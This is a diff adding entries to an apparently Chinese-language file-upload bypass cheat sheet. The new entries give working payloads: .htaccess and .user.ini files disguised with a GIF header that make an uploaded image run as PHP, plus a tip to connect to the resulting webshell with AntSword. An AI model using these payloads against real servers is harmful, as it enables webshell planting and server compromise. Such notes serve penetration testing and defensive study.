@@ -58,7 +58,19 @@ echo phpinfo();
   `cdx、cer、asa`
 - jsp可执行后缀  
   `jspx`
-
+- 将.htacess或.user.ini文件伪造成图片文件格式上传，使得含恶意载荷的jpg文件可以被解析
+    - `.htacess`，让含test字符的文件当做php解析
+    ```
+    GIF
+    <FilesMatch "test">
+    SetHandler application/x-httpd-php
+    </FilesMatch>
+    ```
+    - `.user.ini`，表示执行该目录的php文件时都会包含test.jpg，一般需要先上传含有恶意php载荷的图片test.jpg，然后请求该目录下的*.php文件，使用antsword连接。
+    ```
+    GIF
+    auto_prepend_file=test.jpg
+    ```
 
 ## 源代码
 ```php
